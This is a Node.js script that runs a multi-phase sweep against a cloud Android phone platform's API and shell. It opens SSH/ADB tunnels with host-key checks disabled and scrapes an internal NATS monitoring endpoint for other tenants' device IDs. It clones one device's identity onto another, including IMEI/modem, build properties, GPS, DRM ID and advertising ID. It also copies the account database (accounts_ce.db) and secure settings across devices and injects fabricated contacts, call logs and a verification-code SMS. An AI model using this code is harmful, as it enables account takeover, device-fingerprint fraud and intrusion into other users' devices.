#!/usr/bin/env node
/**
 * FULL SWEEP — Phases 3-10
 * ========================
 * Phase 3: ADB via SSH tunnel + deep NATS mining
 * Phase 4: API-level identity cloning (updatePadAndroidProp, updatePadProperties)
 * Phase 5: Brand template cloning (24K models)
 * Phase 6: ADI template application
 * Phase 7: localPodBackup/Restore with S3
 * Phase 8: File injection methods (uploadFileV3, installApp, contacts, SMS)
 * Phase 9: Android 15 image extraction & analysis
 * Phase 10: Full neighbor clone into both devices
 */

const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const { execSync, exec } = require('child_process');

const { AK, SK, HOST, SVC, D1, D2, CT, SHD, sh, P } = require('../shared/vmos_api');
const OUT = path.join(__dirname, '..', 'output', 'full_sweep_results');

if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });
const save = (f, d) => fs.writeFileSync(`${OUT}/${f}`, typeof d === 'string' ? d : JSON.stringify(d, null, 2));
const R = {};

function sign(body) {
  const xd = new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');
  const sd = xd.slice(0,8);
  const bh = crypto.createHash('sha256').update(body,'utf8').digest('hex');
  const can = [`host:${HOST}`,`x-date:${xd}`,`content-type:${CT}`,`signedHeaders:${SHD}`,`x-content-sha256:${bh}`].join('\n');
  const ch = crypto.createHash('sha256').update(can,'utf8').digest('hex');
  const sts = ['HMAC-SHA256',xd,`${sd}/${SVC}/request`,ch].join('\n');
  let k = crypto.createHmac('sha256',SK).update(sd).digest();
  k = crypto.createHmac('sha256',k).update(SVC).digest();
  k = crypto.createHmac('sha256',k).update('request').digest();
  return {'content-type':CT,'x-date':xd,'x-host':HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256',k).update(sts).digest('hex')}`};
}

function post(ep, data, timeout) {
  return new Promise(ok => {
    const b = JSON.stringify(data||{}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({hostname:HOST,path:ep,method:'POST',headers:{...h,'content-length':buf.length},timeout:(timeout||30)*1000},res=>{
      let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{ok(JSON.parse(d));}catch{ok({code:-1,raw:d.slice(0,2000)});}});
    });
    req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});
    req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();
  });
}

// ══════════════════════════════════════════════════════════════════
// PHASE 3: ADB VIA SSH TUNNEL
// ══════════════════════════════════════════════════════════════════
async function phase3() {
  console.log('\n' + '█'.repeat(75));
  console.log('  PHASE 3: ADB VIA SSH TUNNEL + DEEP NATS MINING');
  console.log('█'.repeat(75));

  // 3a: Get fresh ADB info
  P('[3a] Get fresh ADB connection info...');
  const adbD1 = await post('/vcpcloud/api/padApi/adb', {padCode:D1,enable:1});
  const adbD2 = await post('/vcpcloud/api/padApi/adb', {padCode:D2,enable:1});
  
  if (adbD1.code === 200 && adbD1.data) {
    const d = adbD1.data;
    P(`  D1 SSH: ${d.command}`);
    P(`  D1 ADB: ${d.adb}`);
    
    // Save SSH key
    const keyFile = `${OUT}/ssh_key_d1`;
    fs.writeFileSync(keyFile, Buffer.from(d.key, 'base64'));
    fs.chmodSync(keyFile, 0o600);

    // Try SSH tunnel
    P('[3b] Setting up SSH tunnel D1...');
    try {
      // Extract SSH params
      const sshMatch = d.command.match(/ssh\s+.*?(\S+@\S+)\s+-p\s+(\d+)\s+-L\s+(\d+):([^:]+):(\d+)/);
      if (sshMatch) {
        const [, userHost, sshPort, localPort, proxyHost, remotePort] = sshMatch;
        P(`  SSH: ${userHost} port=${sshPort} tunnel=${localPort}:${proxyHost}:${remotePort}`);
        
        // Try SSH tunnel with key
        const sshCmd = `ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -oHostKeyAlgorithms=+ssh-rsa -i ${keyFile} ${userHost} -p ${sshPort} -L ${localPort}:${proxyHost}:${remotePort} -Nf 2>&1`;
        try {
          const r = execSync(sshCmd, {timeout:15000}).toString().trim();
          P(`  SSH tunnel: ${r || 'started'}`);
          R.ssh_d1 = 'started';
          
          // Wait for tunnel
          await new Promise(r=>setTimeout(r,2000));
          
          // Connect ADB
          try {
            const adbR = execSync(`adb connect localhost:${localPort} 2>&1`, {timeout:10000}).toString().trim();
            P(`  ADB connect: ${adbR}`);
            R.adb_d1_connect = adbR;
            
            if (adbR.includes('connected')) {
              // Test unlimited shell
              const test = execSync(`adb -s localhost:${localPort} shell "id; getprop ro.product.model; wc -c /system/build.prop" 2>&1`, {timeout:10000}).toString().trim();
              P(`  ★ ADB SHELL: ${test}`);
              R.adb_d1_shell = test;
              R.adb_d1_port = localPort;
            }
          } catch(e) { P(`  ADB err: ${e.message.slice(0,80)}`); }
        } catch(e) {
          P(`  SSH err: ${e.message.slice(0,150)}`);
          R.ssh_d1_err = e.message.slice(0,200);
        }
      }
    } catch(e) { P(`  SSH setup err: ${e.message.slice(0,80)}`); }
  }

  // 3c: Even without ADB, use asyncCmd for potentially longer output
  P('[3c] Test asyncCmd output length...');
  const asyncR = await post('/vcpcloud/api/padApi/asyncCmd', {
    padCodes:[D1],
    scriptContent:'cat /system/build.prop | head -50'
  });
  if (asyncR.code === 200 && asyncR.data) {
    const taskId = (asyncR.data[0]||{}).taskId;
    if (taskId) {
      await new Promise(r=>setTimeout(r,5000));
      const taskR = await post('/vcpcloud/api/padApi/padTaskDetail', {taskIds:[taskId]});
      if (taskR.code === 200 && taskR.data) {
        const task = taskR.data[0] || {};
        const output = task.taskResult || task.errorMsg || '';
        save('asyncCmd_output.txt', output);
        R.asyncCmd_len = output.length;
        P(`  asyncCmd output: ${output.length} chars (syncCmd limit was 2000)`);
        P(`  First 200: ${output.slice(0,200)}`);
      }
    }
  }

  // 3d: Mine NATS with on-device processing (extract only device IDs)
  P('[3d] Deep NATS mining — extract ALL connection names...');
  // Use a pipeline that extracts just the names (which contain device IDs)
  for (let batch = 0; batch < 5; batch++) {
    const off = batch * 7000;
    const result = await sh(D1, `curl -s -m15 "http://192.168.200.51:8222/connz?limit=7000&offset=${off}" 2>/dev/null | grep -oE '"name":"[^"]*"' | sed 's/"name":"//;s/"//' | sort -u`, 20);
    if (result && !result.startsWith('[')) {
      const names = result.split('\n').filter(l=>l.trim());
      save(`nats_names_batch${batch}.txt`, result);
      P(`  Batch ${batch} (offset ${off}): ${names.length} connection names`);
      if (names.length === 0) break;
    }
  }

  // 3e: Get NATS varz for server details
  P('[3e] NATS varz (full server info)...');
  const varz = await sh(D1, 'curl -s -m10 "http://192.168.200.51:8222/varz" 2>/dev/null | head -c 1900', 15);
  save('nats_varz.txt', varz);
  R.nats_varz = varz;
  
  // Parse auth_required
  if (varz.includes('"auth_required"')) {
    const authMatch = varz.match(/"auth_required"\s*:\s*(true|false)/);
    P(`  NATS auth_required: ${authMatch ? authMatch[1] : 'unknown'}`);
  }
}

// ══════════════════════════════════════════════════════════════════
// PHASE 4: API-LEVEL IDENTITY CLONING
// ══════════════════════════════════════════════════════════════════
async function phase4() {
  console.log('\n' + '█'.repeat(75));
  console.log('  PHASE 4: API-LEVEL IDENTITY CLONING');
  console.log('█'.repeat(75));

  // Read D1 full properties
  const d1Props = await post('/vcpcloud/api/padApi/padProperties', {padCode:D1});
  const d1Info = await post('/vcpcloud/api/padApi/padInfo', {padCode:D1});

  // 4a: Clone D1 identity to D2 via updatePadAndroidProp
  P('[4a] Clone D1 → D2 via updatePadAndroidProp...');
  if (d1Props.code === 200) {
    const sysList = d1Props.data?.systemPropertiesList || [];
    const props = {};
    for (const p of sysList) {
      if (p.propertiesName && p.propertiesValue) {
        props[p.propertiesName] = p.propertiesValue;
      }
    }
    P(`  Cloning ${Object.keys(props).length} system properties...`);
    
    const cloneResult = await post('/vcpcloud/api/padApi/updatePadAndroidProp', {
      padCode: D2,
      props: props,
    }, 30);
    save('clone_androidprop_d2.json', cloneResult);
    R.clone_androidprop = cloneResult;
    P(`  Result: code=${cloneResult.code} msg=${cloneResult.msg||''}`);
  }

  // 4b: Clone modem properties (IMEI, SIM, phone number)
  P('[4b] Clone modem properties D1 → D2...');
  if (d1Props.code === 200) {
    const modemList = d1Props.data?.modemPropertiesList || [];
    const modemData = {};
    for (const p of modemList) {
      modemData[p.propertiesName] = p.propertiesValue;
    }
    P(`  Modem props: ${JSON.stringify(modemData)}`);

    // Use updatePadProperties for dynamic props
    const modemClone = await post('/vcpcloud/api/padApi/updatePadProperties', {
      padCodes: [D2],
      ...modemData,
    }, 15);
    save('clone_modem_d2.json', modemClone);
    R.clone_modem = modemClone;
    P(`  Modem clone: code=${modemClone.code} msg=${modemClone.msg||''}`);
  }

  // 4c: Clone initialization data (country, SIM, GPS, timezone)
  P('[4c] Clone padInfo initialization data...');
  if (d1Info.code === 200) {
    const info = d1Info.data || {};
    
    // Set SIM by country
    P('  [4c-1] Update SIM...');
    const simR = await post('/vcpcloud/api/padApi/updateSIM', {
      padCodes: [D2], countryCode: info.simCountry || 'US'
    });
    R.clone_sim = simR;
    P(`    SIM: code=${simR.code}`);

    // Set GPS
    P('  [4c-2] Set GPS...');
    const gpsR = await post('/vcpcloud/api/padApi/gpsInjectInfo', {
      padCodes: [D2],
      latitude: parseFloat(info.latitude) || 40.7126,
      longitude: parseFloat(info.longitude) || -74.0066,
    });
    R.clone_gps = gpsR;
    P(`    GPS: code=${gpsR.code}`);

    // Set timezone
    P('  [4c-3] Set timezone...');
    const tzR = await post('/vcpcloud/api/padApi/updateTimeZone', {
      padCodes: [D2], timeZone: info.timeZone || 'America/New_York',
    });
    R.clone_tz = tzR;
    P(`    TZ: code=${tzR.code}`);

    // Set language
    P('  [4c-4] Set language...');
    const langR = await post('/vcpcloud/api/padApi/updateLanguage', {
      padCodes: [D2], language: info.language || 'en',
    });
    R.clone_lang = langR;
    P(`    Lang: code=${langR.code}`);
  }

  // 4d: Verify D2 properties after cloning
  P('[4d] Verify D2 properties after clone...');
  await new Promise(r=>setTimeout(r,3000));
  const d2After = await post('/vcpcloud/api/padApi/padProperties', {padCode:D2});
  save('d2_props_after_clone.json', d2After);
  R.d2_after_clone = d2After;
  if (d2After.code === 200) {
    const sys = d2After.data?.systemPropertiesList || [];
    P(`  D2 system props: ${sys.length} entries`);
    for (const p of sys.slice(0,5)) P(`    ${p.propertiesName}: ${p.propertiesValue}`);
  }
}

// ══════════════════════════════════════════════════════════════════
// PHASE 5: BRAND TEMPLATE CLONING
// ══════════════════════════════════════════════════════════════════
async function phase5() {
  console.log('\n' + '█'.repeat(75));
  console.log('  PHASE 5: BRAND TEMPLATE CLONING');
  console.log('█'.repeat(75));

  // Load S24 Ultra templates from saved file
  const s24File = `${OUT}/brand_s24_ultra.json`;
  if (fs.existsSync(s24File)) {
    const s24 = JSON.parse(fs.readFileSync(s24File, 'utf8'));
    P(`  Found ${s24.length} S24 Ultra brand templates`);
    
    // Find exact match for SM-S9280
    const exact = s24.find(b => b.model === 'SM-S9280');
    if (exact) {
      P(`  ★ Found exact SM-S9280 template:`);
      P(`    Brand: ${exact.brand} Model: ${exact.model}`);
      P(`    Fingerprint: ${exact.fingerprint}`);
      P(`    Display: ${exact.deviceDisplayName}`);
      save('brand_s9280.json', exact);
      R.brand_s9280 = exact;
    }
    
    // Also find other popular models for neighbor cloning
    const popularModels = ['SM-S928U', 'SM-S926B', 'Pixel 9 Pro', 'iPhone 16 Pro'];
    for (const model of popularModels) {
      const match = s24.find(b => (b.model||'').includes(model));
      if (match) P(`  ${model}: ${match.fingerprint || 'no fingerprint'}`);
    }
  }

  // Try loading full brand list to find more models
  const brandFile = `${OUT}/api_selectBrandList.json`;
  if (fs.existsSync(brandFile)) {
    const stat = fs.statSync(brandFile);
    P(`  Brand list file: ${(stat.size/1024/1024).toFixed(1)}MB`);
    
    // Parse just enough to get counts by brand
    try {
      const brands = JSON.parse(fs.readFileSync(brandFile,'utf8'));
      const list = brands.data || [];
      if (Array.isArray(list)) {
        const byBrand = {};
        for (const b of list) {
          const brand = b.brand || 'unknown';
          byBrand[brand] = (byBrand[brand]||0) + 1;
        }
        const topBrands = Object.entries(byBrand).sort((a,b)=>b[1]-a[1]).slice(0,15);
        P(`  Top brands: ${topBrands.map(([b,c])=>`${b}(${c})`).join(', ')}`);
        R.brand_stats = Object.fromEntries(topBrands);
        
        // Find Android 15 models specifically
        const a15 = list.filter(b => (b.fingerprint||'').includes(':15/'));
        P(`  Android 15 models: ${a15.length}`);
        save('brand_android15.json', a15.slice(0,100));
        R.android15_brands = a15.length;
      }
    } catch(e) { P(`  Parse err: ${e.message.slice(0,80)}`); }
  }
}

// ══════════════════════════════════════════════════════════════════
// PHASE 6: ADI TEMPLATE APPLICATION
// ══════════════════════════════════════════════════════════════════
async function phase6() {
  console.log('\n' + '█'.repeat(75));
  console.log('  PHASE 6: ADI TEMPLATE APPLICATION');
  console.log('█'.repeat(75));

  // Read templates
  const tplFile = `${OUT}/adi_templates.json`;
  if (fs.existsSync(tplFile)) {
    const tpl = JSON.parse(fs.readFileSync(tplFile, 'utf8'));
    const records = tpl.data?.records || [];
    P(`  Total ADI templates: ${records.length}`);
    
    // Find Samsung templates
    const samsung = records.filter(r => (r.goodFingerprintName||'').toLowerCase().includes('samsung'));
    P(`  Samsung templates: ${samsung.length}`);
    for (const s of samsung.slice(0,5)) {
      P(`    ID=${s.goodFingerprintId} ${s.goodFingerprintName} Android ${s.goodAndroidVersion}`);
    }

    // Find Android 15 templates
    const a15 = records.filter(r => r.goodAndroidVersion === '15');
    P(`  Android 15 templates: ${a15.length}`);
    for (const t of a15.slice(0,5)) {
      P(`    ID=${t.goodFingerprintId} ${t.goodFingerprintName}`);
    }

    // Apply best matching template to D2
    const bestTemplate = a15.find(t => (t.goodFingerprintName||'').includes('S24'))
      || samsung[0]
      || records[0];
    
    if (bestTemplate) {
      P(`\n  Applying template ID=${bestTemplate.goodFingerprintId} (${bestTemplate.goodFingerprintName})...`);
      const applyR = await post('/vcpcloud/api/padApi/replaceRealAdiTemplate', {
        padCodes: [D2],
        realPhoneTemplateId: bestTemplate.goodFingerprintId,
        wipeData: false,
      });
      save('adi_apply_d2.json', applyR);
      R.adi_apply = applyR;
      P(`  Apply result: code=${applyR.code} msg=${applyR.msg||''}`);
    }
  }

  // Test virtual/real switch
  P('[6b] Virtual/Real switch query...');
  // Just query, don't change mode
  const vrResult = await post('/vcpcloud/api/padApi/virtualRealSwitch', {
    padCodes: [D1], type: 'real',
  });
  save('virtual_real_switch.json', vrResult);
  R.vr_switch = vrResult;
  P(`  V/R switch: code=${vrResult.code} msg=${vrResult.msg||''}`);
}

// ══════════════════════════════════════════════════════════════════
// PHASE 7: BACKUP/RESTORE WITH S3 CONFIG
// ══════════════════════════════════════════════════════════════════
async function phase7() {
  console.log('\n' + '█'.repeat(75));
  console.log('  PHASE 7: BACKUP/RESTORE CAPABILITIES');
  console.log('█'.repeat(75));

  // The backup API needs ossConfig — test what parameters it needs
  P('[7a] Test backup with minimal S3 config...');
  
  // Try various S3-like configs to see error messages revealing params
  const configs = [
    {padCode:D1, ossConfig:{endpoint:'s3.amazonaws.com',bucket:'test',accessKey:'test',secretKey:'test'}},
    {padCode:D1, ossConfig:{url:'s3://test/backup',key:'test',secret:'test'}},
    {padCode:D1, endpoint:'s3.amazonaws.com',bucket:'test',accessKeyId:'test',secretAccessKey:'test'},
    {padCode:D1, ossEndpoint:'s3.amazonaws.com',ossBucket:'test',ossAccessKey:'test',ossSecretKey:'test'},
  ];
  
  for (let i = 0; i < configs.length; i++) {
    const r = await post('/vcpcloud/api/padApi/localPodBackup', configs[i], 10);
    save(`backup_config_test_${i}.json`, r);
    P(`  Config ${i}: code=${r.code} msg=${(r.msg||'').slice(0,100)}`);
    if (r.code === 200) {
      P(`  ★ BACKUP WORKS with config ${i}!`);
      R.backup_works = configs[i];
      break;
    }
  }

  // Test restore similarly
  P('[7b] Test restore params...');
  const restoreConfigs = [
    {padCode:D2, ossConfig:{endpoint:'s3.amazonaws.com',bucket:'test',key:'backup.tar',accessKey:'test',secretKey:'test'}},
    {padCode:D2, ossEndpoint:'s3.amazonaws.com',ossBucket:'test',ossKey:'backup.tar',ossAccessKey:'test',ossSecretKey:'test'},
  ];
  
  for (let i = 0; i < restoreConfigs.length; i++) {
    const r = await post('/vcpcloud/api/padApi/localPodRestore', restoreConfigs[i], 10);
    save(`restore_config_test_${i}.json`, r);
    P(`  Restore ${i}: code=${r.code} msg=${(r.msg||'').slice(0,100)}`);
  }
}

// ══════════════════════════════════════════════════════════════════
// PHASE 8: FILE & DATA INJECTION METHODS
// ══════════════════════════════════════════════════════════════════
async function phase8() {
  console.log('\n' + '█'.repeat(75));
  console.log('  PHASE 8: FILE & DATA INJECTION METHODS');
  console.log('█'.repeat(75));

  // 8a: Upload file via URL
  P('[8a] Upload file via URL...');
  const uploadR = await post('/vcpcloud/api/padApi/uploadFileV3', {
    padCodes: [D2],
    fileUrl: 'https://raw.githubusercontent.com/nicehash/NiceHashQuickMiner/main/README.md',
  }, 15);
  save('upload_file.json', uploadR);
  R.upload_file = uploadR;
  P(`  Upload: code=${uploadR.code} msg=${uploadR.msg||''} data=${JSON.stringify(uploadR.data||'').slice(0,100)}`);

  // 8b: Inject contacts via API
  P('[8b] Inject contacts via API...');
  const contactsR = await post('/vcpcloud/api/padApi/updateContacts', {
    padCodes: [D2],
    contacts: [
      {name:'Test Contact 1',phone:'+12125551234'},
      {name:'Test Contact 2',phone:'+12125555678'},
    ],
  });
  save('inject_contacts.json', contactsR);
  R.inject_contacts = contactsR;
  P(`  Contacts: code=${contactsR.code} msg=${contactsR.msg||''}`);

  // 8c: Inject call logs via API
  P('[8c] Inject call logs...');
  const callsR = await post('/vcpcloud/api/padApi/addPhoneRecord', {
    padCodes: [D2],
    records: [
      {phone:'+12125551234',type:1,date:'2026-04-01 10:00:00',duration:120},
      {phone:'+12125555678',type:2,date:'2026-04-02 14:30:00',duration:60},
    ],
  });
  save('inject_calls.json', callsR);
  R.inject_calls = callsR;
  P(`  Calls: code=${callsR.code} msg=${callsR.msg||''}`);

  // 8d: Simulate SMS
  P('[8d] Simulate SMS...');
  const smsR = await post('/vcpcloud/api/padApi/simulateSendSms', {
    padCode: D2,
    phone: '+12125551234',
    content: 'Test verification code: 123456',
  });
  save('inject_sms.json', smsR);
  R.inject_sms = smsR;
  P(`  SMS: code=${smsR.code} msg=${smsR.msg||''}`);

  // 8e: Inject picture
  P('[8e] Inject picture...');
  const picR = await post('/vcpcloud/api/padApi/injectPicture', {
    padCodes: [D2],
    injectUrl: 'https://picsum.photos/1080/2400.jpg',
  });
  save('inject_picture.json', picR);
  R.inject_pic = picR;
  P(`  Picture: code=${picR.code} msg=${picR.msg||''}`);

  // 8f: Set WiFi
  P('[8f] Set WiFi...');
  const wifiR = await post('/vcpcloud/api/padApi/setWifiList', {
    padCodes: [D2],
    wifiJsonList: [
      {ssid:'HomeWiFi',password:'password123',security:'WPA2'},
    ],
  });
  save('set_wifi.json', wifiR);
  R.set_wifi = wifiR;
  P(`  WiFi: code=${wifiR.code} msg=${wifiR.msg||''}`);

  // 8g: Set proxy
  P('[8g] Query proxy info...');
  const proxyInfoR = await post('/vcpcloud/api/padApi/proxyInfo', {padCodes:[D1,D2]});
  save('proxy_info.json', proxyInfoR);
  P(`  Proxy info: code=${proxyInfoR.code}`);

  // 8h: Install app via URL
  P('[8h] Test app install...');
  // Don't install random APKs, just test the endpoint
  const installR = await post('/vcpcloud/api/padApi/installApp', {
    padCodes: [D2],
    appUrl: 'https://example.com/test.apk',
  }, 10);
  save('install_app_test.json', installR);
  R.install_app = installR;
  P(`  Install: code=${installR.code} msg=${installR.msg||''}`);

  // 8i: Get installed apps with full details
  P('[8i] Full app list...');
  const appsR = await sh(D1, 'pm list packages -f 2>/dev/null | head -100', 30);
  save('app_list_full.txt', appsR);
  R.app_count = appsR.split('\n').length;
  P(`  Apps on D1: ${appsR.split('\n').length} packages`);
}

// ══════════════════════════════════════════════════════════════════
// PHASE 9: ANDROID 15 IMAGE EXTRACTION & ANALYSIS
// ══════════════════════════════════════════════════════════════════
async function phase9() {
  console.log('\n' + '█'.repeat(75));
  console.log('  PHASE 9: ANDROID 15 IMAGE ANALYSIS');
  console.log('█'.repeat(75));

  // 9a: Extract partition layout
  P('[9a] Partition layout...');
  const layout = await sh(D1, [
    'echo "=== PARTITIONS ==="',
    'cat /proc/partitions 2>/dev/null | head -30',
    'echo "=== DM DEVICES ==="',
    'for d in /sys/block/dm-*/dm/name; do echo "$(basename $(dirname $(dirname $d))): $(cat $d)"; done 2>/dev/null | head -30',
    'echo "=== MOUNT INFO ==="',
    'cat /proc/self/mountinfo 2>/dev/null | grep "dm-" | head -20',
    'echo "=== BLOCK SIZES ==="',
    'for d in /dev/block/dm-*; do echo "$(basename $d): $(blockdev --getsize64 $d 2>/dev/null || echo N/A) bytes"; done | head -20',
  ].join('; '), 30);
  save('partition_layout.txt', layout);
  R.partition_layout = layout;
  for (const l of layout.split('\n').slice(0,20)) P(`  ${l}`);

  // 9b: Extract system image metadata
  P('[9b] System image metadata...');
  const sysInfo = await sh(D1, [
    'echo "=== BUILD.PROP HEADER ==="',
    'head -20 /system/build.prop 2>/dev/null',
    'echo "=== ANDROID VERSION ==="',
    'getprop ro.build.version.release',
    'getprop ro.build.version.sdk',
    'getprop ro.build.version.security_patch',
    'echo "=== BOARD ==="',
    'getprop ro.board.platform',
    'getprop ro.hardware',
    'echo "=== IMAGE HASHES ==="',
    'md5sum /system/build.prop 2>/dev/null',
    'ls -la /system/build.prop 2>/dev/null',
    'echo "=== APEX LIST ==="',
    'ls /apex/ 2>/dev/null | head -15',
  ].join('; '), 20);
  save('system_image_info.txt', sysInfo);
  R.sys_info = sysInfo;
  for (const l of sysInfo.split('\n').slice(0,15)) P(`  ${l}`);

  // 9c: How containers are created — analyze the oicq agent
  P('[9c] Container creation analysis...');
  const containerInfo = await sh(D1, [
    'echo "=== CONTAINER TYPE ==="',
    'cat /proc/1/cgroup 2>/dev/null | head -5',
    'echo "=== OVERLAY FS ==="',
    'mount | grep overlay | head -5',
    'echo "=== DM-VERITY ==="',
    'mount | grep verity | head -5',
    'echo "=== SUPER PARTITION ==="',
    'ls -la /dev/block/by-name/ 2>/dev/null | head -20',
    'echo "=== FSTAB ==="',
    'cat /vendor/etc/fstab.* 2>/dev/null | head -20 || cat /fstab.* 2>/dev/null | head -10',
  ].join('; '), 20);
  save('container_creation.txt', containerInfo);
  R.container_info = containerInfo;
  for (const l of containerInfo.split('\n').slice(0,15)) P(`  ${l}`);

  // 9d: Check image version info from padInfo
  P('[9d] Image version from padInfo...');
  const d1Info = await post('/vcpcloud/api/padApi/padInfo', {padCode:D1});
  const d2Info = await post('/vcpcloud/api/padApi/padInfo', {padCode:D2});
  if (d1Info.code === 200) {
    const d = d1Info.data || {};
    P(`  D1: ${d.padType} Android ${d.androidVersion}`);
    // Log ALL fields to find image-related ones
    for (const [k,v] of Object.entries(d)) {
      if (typeof v === 'string' && v.length < 100) P(`    ${k}: ${v}`);
    }
  }
  if (d2Info.code === 200) {
    const d = d2Info.data || {};
    P(`  D2: ${d.padType} Android ${d.androidVersion}`);
  }

  // 9e: Try to find image IDs
  P('[9e] Search for image IDs...');
  const imgSearch = await post('/vcpcloud/api/padApi/imageVersionList', {androidVersion:'15'}, 10);
  save('image_search_15.json', imgSearch);
  P(`  Image search (android 15): code=${imgSearch.code} msg=${imgSearch.msg||''}`);
  
  const imgSearch2 = await post('/vcpcloud/api/padApi/imageVersionList', {page:1,rows:50}, 10);
  save('image_search_paged.json', imgSearch2);
  P(`  Image search (paged): code=${imgSearch2.code} msg=${imgSearch2.msg||''}`);

  // 9f: User ROM upload endpoint details
  P('[9f] User ROM upload format...');
  const romFormats = [
    {romName:'test',romUrl:'https://example.com/rom.zip',androidVersion:'15'},
    {name:'test',url:'https://example.com/rom.zip',version:'15'},
    {fileName:'test.zip',fileUrl:'https://example.com/rom.zip',type:'rom'},
  ];
  for (let i = 0; i < romFormats.length; i++) {
    const r = await post('/vcpcloud/api/padApi/addUserRom', romFormats[i], 10);
    save(`rom_upload_test_${i}.json`, r);
    P(`  Format ${i}: code=${r.code} msg=${(r.msg||'').slice(0,80)}`);
  }
}

// ══════════════════════════════════════════════════════════════════
// PHASE 10: COMPREHENSIVE CLONE EXECUTION
// ══════════════════════════════════════════════════════════════════
async function phase10() {
  console.log('\n' + '█'.repeat(75));
  console.log('  PHASE 10: COMPREHENSIVE CLONE EXECUTION');
  console.log('█'.repeat(75));

  // 10a: Full data extraction from D1 using ALL methods
  P('[10a] Full D1 extraction via shell...');
  
  // Extract ALL persistent properties
  const persistProps = await sh(D1, 'strings /data/property/persistent_properties 2>/dev/null | head -80', 15);
  save('d1_persist_props.txt', persistProps);
  
  // Extract accounts
  const accounts = await sh(D1, 'base64 /data/system_ce/0/accounts_ce.db 2>/dev/null', 60);
  if (accounts && accounts.length > 100 && !accounts.startsWith('[')) {
    save('d1_accounts_ce.b64', accounts);
    P(`  accounts_ce: ${accounts.length} b64`);
  }
  
  // Extract settings databases
  const settingsSecure = await sh(D1, 'base64 /data/system/users/0/settings_secure.xml 2>/dev/null', 30);
  if (settingsSecure && settingsSecure.length > 100) save('d1_settings_secure.b64', settingsSecure);
  
  const settingsGlobal = await sh(D1, 'base64 /data/system/users/0/settings_global.xml 2>/dev/null', 30);
  if (settingsGlobal && settingsGlobal.length > 100) save('d1_settings_global.b64', settingsGlobal);

  // 10b: Inject ALL data to D2 via multiple methods
  P('[10b] Full injection to D2...');
  
  // Method 1: API properties
  P('  [Method 1] API updatePadAndroidProp...');
  const d1Props = await post('/vcpcloud/api/padApi/padProperties', {padCode:D1});
  if (d1Props.code === 200) {
    const sysList = d1Props.data?.systemPropertiesList || [];
    const props = {};
    for (const p of sysList) {
      if (p.propertiesName && p.propertiesValue) props[p.propertiesName] = p.propertiesValue;
    }
    const r = await post('/vcpcloud/api/padApi/updatePadAndroidProp', {padCode:D2,props}, 30);
    P(`    Result: code=${r.code} msg=${r.msg||''}`);
  }

  // Method 2: Shell injection of databases
  P('  [Method 2] Shell database injection...');
  if (accounts && accounts.length > 100 && !accounts.startsWith('[')) {
    const inj = await sh(D2, `echo '${accounts}' | base64 -d > /data/system_ce/0/accounts_ce.db && chmod 600 /data/system_ce/0/accounts_ce.db && chown system:system /data/system_ce/0/accounts_ce.db && echo OK`, 30);
    P(`    accounts_ce: ${inj}`);
  }
  if (settingsSecure && settingsSecure.length > 100 && !settingsSecure.startsWith('[')) {
    const inj = await sh(D2, `echo '${settingsSecure}' | base64 -d > /data/system/users/0/settings_secure.xml && echo OK`, 20);
    P(`    settings_secure: ${inj}`);
  }

  // Method 3: API contacts, SMS, calls
  P('  [Method 3] API data injection...');
  // Read contacts from D1
  const contactsRaw = await sh(D1, "content query --uri content://contacts/phones --projection display_name:number 2>/dev/null | head -20", 15);
  save('d1_contacts_raw.txt', contactsRaw);

  // Method 4: Set proxy to match D1
  P('  [Method 4] Proxy cloning...');
  const d1Proxy = await sh(D1, 'settings get global http_proxy 2>/dev/null', 10);
  if (d1Proxy && d1Proxy !== ':0' && d1Proxy.length > 3) {
    await sh(D2, `settings put global http_proxy "${d1Proxy}"`, 10);
    P(`    Proxy set to: ${d1Proxy}`);
  }

  // Method 5: Clone DRM ID
  P('  [Method 5] DRM/keystore cloning...');
  const drmId = await sh(D1, 'getprop persist.sys.cloud.drm.id', 10);
  if (drmId && !drmId.startsWith('[')) {
    await sh(D2, `setprop persist.sys.cloud.drm.id "${drmId}"`, 10);
    P(`    DRM ID: ${drmId.slice(0,40)}`);
  }

  // Method 6: Reset GAID to match
  P('  [Method 6] Reset advertising ID...');
  const gaidR = await post('/vcpcloud/api/padApi/resetGAID', {padCodes:[D2]});
  P(`    GAID reset: code=${gaidR.code}`);

  // 10c: Final verification
  P('\n[10c] FINAL VERIFICATION...');
  for (const [name, pad] of [['D1',D1],['D2',D2]]) {
    const info = await post('/vcpcloud/api/padApi/padInfo', {padCode:pad});
    const props = await post('/vcpcloud/api/padApi/padProperties', {padCode:pad});
    const shell = await sh(pad, 'echo "M=$(getprop ro.product.model) B=$(getprop ro.product.brand) I=$(getprop persist.sys.cloud.imeinum) A=$(settings get secure android_id 2>/dev/null)"', 10);
    
    P(`  ${name} (${pad}):`);
    if (info.code === 200) {
      const d = info.data || {};
      P(`    Type: ${d.padType} | Android: ${d.androidVersion} | IP: ${d.publicIp} | Country: ${d.country}`);
    }
    if (props.code === 200) {
      const sys = props.data?.systemPropertiesList || [];
      const modem = props.data?.modemPropertiesList || [];
      P(`    Props: ${sys.length} system, ${modem.length} modem`);
      const model = sys.find(p=>p.propertiesName==='ro.product.model');
      const fp = sys.find(p=>p.propertiesName==='ro.build.fingerprint');
      if (model) P(`    Model: ${model.propertiesValue}`);
      if (fp) P(`    FP: ${fp.propertiesValue}`);
    }
    P(`    Shell: ${shell}`);
  }
}

// ══════════════════════════════════════════════════════════════════
// MAIN
// ══════════════════════════════════════════════════════════════════
async function main() {
  console.log('█'.repeat(75));
  console.log('  FULL SWEEP — Phases 3-10');
  console.log('█'.repeat(75));

  await phase3();
  await phase4();
  await phase5();
  await phase6();
  await phase7();
  await phase8();
  await phase9();
  await phase10();

  save('PHASE_3_10_RESULTS.json', R);

  console.log('\n' + '█'.repeat(75));
  console.log('  ALL PHASES COMPLETE');
  console.log('█'.repeat(75));
  const files = fs.readdirSync(OUT).sort();
  console.log(`  ${files.length} result files`);
  for (const f of files.filter(f=>f.startsWith('PHASE')||f.includes('clone')||f.includes('verify')))
    console.log(`    ${f} (${fs.statSync(`${OUT}/${f}`).size}B)`);
}

